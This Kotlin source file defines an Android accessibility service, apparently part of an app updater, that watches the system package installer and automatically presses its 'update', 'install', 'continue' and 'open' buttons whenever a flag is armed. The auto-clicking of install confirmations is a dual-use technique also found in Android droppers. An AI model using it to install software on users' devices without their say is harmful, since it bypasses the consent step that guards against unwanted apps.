package house.anderson.amigos.updater

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class UpdaterAccessibilityService : AccessibilityService() {
    companion object {
        private val INSTALLER_PACKAGES = setOf(
            "com.google.android.packageinstaller",
            "com.android.packageinstaller",
            "com.google.android.permissioncontroller"
        )
        private val INSTALL_WORDS = listOf("update", "install", "continue")
        private val OPEN_WORDS = listOf("open")
        @Volatile private var lastClickAt = 0L
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (!UpdaterState.isArmed(this)) return

        val pkg = event.packageName?.toString() ?: return
        if (pkg !in INSTALLER_PACKAGES) return

        val phase = UpdaterState.phase(this)
        val wanted = if (phase == "installed") OPEN_WORDS else INSTALL_WORDS
        val root = rootInActiveWindow ?: return

        val clicked = findAndClick(root, wanted)
        if (clicked) {
            UpdaterState.note(this, "Accessibility clicked: ${wanted.joinToString("/")}; package=$pkg")
        }
    }

    private fun findAndClick(root: AccessibilityNodeInfo, words: List<String>): Boolean {
        val now = System.currentTimeMillis()
        if (now - lastClickAt < 800L) return false

        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)

        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val label = listOfNotNull(node.text, node.contentDescription)
                .joinToString(" ")
                .trim()
                .lowercase()

            if (label in words) {
                var clickable: AccessibilityNodeInfo? = node
                repeat(5) {
                    if (clickable?.isClickable == true) return@repeat
                    clickable = clickable?.parent
                }
                if (clickable?.isClickable == true &&
                    clickable?.performAction(AccessibilityNodeInfo.ACTION_CLICK) == true) {
                    lastClickAt = now
                    return true
                }
            }

            for (i in 0 until node.childCount) {
                node.getChild(i)?.let(queue::add)
            }
        }
        return false
    }

    override fun onInterrupt() = Unit
}
